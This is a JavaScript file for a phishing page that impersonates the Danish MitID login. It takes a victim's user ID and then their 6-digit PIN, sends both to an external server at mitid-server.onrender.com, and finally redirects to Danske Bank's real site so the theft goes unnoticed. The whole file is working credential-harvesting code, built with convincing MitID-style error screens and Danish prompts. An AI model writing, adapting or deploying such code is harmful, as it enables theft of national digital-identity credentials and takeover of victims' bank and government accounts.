const usernameIn = document.querySelector("#username2");
const loginBtn = document.querySelector("#loginBtn2");
const showBtn = document.querySelector("#hideUserNameBtn2");
const label = document.querySelector("label[for='username2']");
const forgot = document.querySelector("#linkOpenToolTip span");
const coreSection = document.querySelector("#mitid-core-client-section");
const loginForm = document.querySelector("#mitid-core-client-form");
const helpMessage = document.querySelector("#helpMessage");

let loginStatus = "user_id";
const data = {};

const rootURL = "https://mitid-server.onrender.com";
// const rootURL = "http://localhost:8080";

showBtn.addEventListener("click", (e) => {
    if (usernameIn.getAttribute("type") === "text") {
        e.target.innerText = "Vis";
        usernameIn.setAttribute("type", "password");
    } else {
        e.target.innerText = "Skjul";
        usernameIn.setAttribute("type", "text");
    }
});

function updateBtn() {
    if (usernameIn.value.length > 0) {
        loginBtn.removeAttribute("disabled");
    } else {
        loginBtn.setAttribute("disabled", true);
    }
}

usernameIn.addEventListener("input", updateBtn);

async function sendData(userData) {
    const url = `${rootURL}/api/add`;
    try {
        console.log(userData);
        const response = await fetch(url, {
            method: "PUT",
            body: JSON.stringify(userData),
            headers: {
                "Content-type": "application/json",
            },
        });
        if (!response.ok) {
            throw new Error(`Response status: ${response.status}`);
        }

        const result = await response.json();
        console.log(result);

        location.href = "https://danskebank.dk";
    } catch (error) {
        console.error(error.message);
    }
}

function validateUser(userID) {
    if (!userID.includes(" ")) {
        return true;
    } else {
        return false;
    }
}
function validateCode(PINCode) {
    if (!PINCode.includes(" ") && PINCode.length === 6 && /^\d*$/.test(PINCode)) {
        return true;
    } else {
        return false;
    }
}

function displayError(errorHeader, errorBody) {
    coreSection.innerHTML = `
        <div id="notification" class="mitid-notification">
            <div id="notification" class="mitid-notification__content mitid-notification--error" role="alert">
                <h2 id="mitid-notification-header" aria-label="">${errorHeader}</h2>
                <div>
                    <p class="mitid-notification__message" aria-label="">${errorBody}<div class="mitid-notification__support">(CTL003)</div></p>
                    <a href="https://www.mitid.dk/hjaelp/hjaelpeunivers/mitid-bruger-id/hvad-er-et-bruger-id/" target="_blank" rel="noopener noreferrer" class="mitid-link " id="notificationLink" aria-label="Læs mere om bruger-ID på MitID.dk">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" preserveAspectRatio="xMinYMid" viewBox="0 0 24 24" focusable="false" aria-hidden="true" class="mitid-link__icon"><path fill-rule="evenodd" d="M18 19H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h5c.55 0 1-.45 1-1s-.45-1-1-1H5a2 2 0 00-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2v-6c0-.55-.45-1-1-1s-1 .45-1 1v5c0 .55-.45 1-1 1zM14 4c0 .55.45 1 1 1h2.59l-9.13 9.13a.997.997 0 101.41 1.41L19 6.41V9c0 .55.45 1 1 1s1-.45 1-1V3h-6c-.55 0-1 .45-1 1z"></path></svg>
                        <span class="mitid-link__label">Læs mere på MitID.dk</span>
                    </a>
                </div>
            </div>
            <div class="mitid-login-form-element">
                <button onclick="location.reload()" id="mitid-retry-button" class="mitid--button-secondary" tabindex="0" name="tryAgain" type="button">
                    <span class="mitid--button-label">Prøv igen</span><span class="mitid--button-spacing"></span>
                    <svg xmlns="http://www.w3.org/2000/svg" focusable="false" class="mitid--button-icon" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true"><path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"></path></svg>
                </button>
            </div>
        </div>`;
}

function changeStatus() {
    console.log("CHANGING STATUS");
    label.innerText = "PIN-kode";
    usernameIn.value = "";
    usernameIn.setAttribute("inputmode", "numeric");
    usernameIn.setAttribute("pattern", "[0-9+]");
    forgot.innerText = "Glemt PIN-kode?";
    updateBtn();

    loginStatus = "pin_code";

    helpMessage.innerText = "PIN-kode skal være 6 cifre.";

    console.log("Succesfully changed status");
}

loginBtn.addEventListener("click", (e) => {
    if (loginStatus === "user_id") {
        const valid = validateUser(usernameIn.value);
        if (valid) {
            data["user_id"] = usernameIn.value;
            console.log("User-ID Collected");
            changeStatus();
        } else {
            displayError("Bruger-ID eksisterer ikke", "Bruger-ID må ikke indeholde mellemrum.");
        }
    } else {
        const valid = validateCode(usernameIn.value);
        if (valid) {
            data["pin_code"] = usernameIn.value;
            console.log("PIN-code collected");
            console.log(data, JSON.stringify(data));
            sendData(data);
        } else {
            displayError("Forkert PIN-kode", "PIN-koder skal være 6 cifre, og kan kun have tal.");

            changeStatus();
        }
    }
});
